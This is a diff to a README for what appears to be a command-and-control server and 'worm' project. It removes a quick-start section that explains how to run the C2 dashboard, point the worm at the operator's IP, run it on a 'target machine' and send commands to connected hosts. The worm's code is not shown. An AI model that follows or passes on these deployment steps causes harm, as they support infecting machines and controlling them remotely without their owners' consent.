@@ -4,7 +4,6 @@
 
 ## Table of Contents
 
-- [Quick Start Guide](#quick-start-guide)
 - [License](#license)
 - [Overview](#overview)
 - [Features](#features)
@@ -33,43 +32,6 @@
 - [Update Process](#update-process)
 - [Support](#support)
 - [Quick Reference](#quick-reference)
----
-# Quick Start Guide
-
-## For the Impatient
-
-### 1. Start the C2 Server (Your Machine)
-
-```bash
-# Install dependencies
-pip install Flask==2.3.2 Flask-SocketIO==5.3.4 python-socketio==5.8.0 eventlet==0.33.3
-
-# Run the server
-python c2_server.py
-
-# Access dashboard at http://localhost:5000
-# Login: admin / secure_password_123
-```
-
-### 2. Deploy the Worm (Target Machine)
-
-```bash
-# Edit worm.py and set C2_SERVER to your IP
-C2_SERVER = '192.168.1.100'  # Your machine's IP
-
-# Run the worm
-python3 worm.py
-```
-
-### 3. Send Commands
-
-1. Open your browser to `http://localhost:5000`
-2. Click on a connected host.
-3. Select a command from the dropdown menu.
-4. Click **Send Command**.
-
-The client will automatically connect and execute the selected commands.
-
 ---
 
 # Legal Disclaimer and License
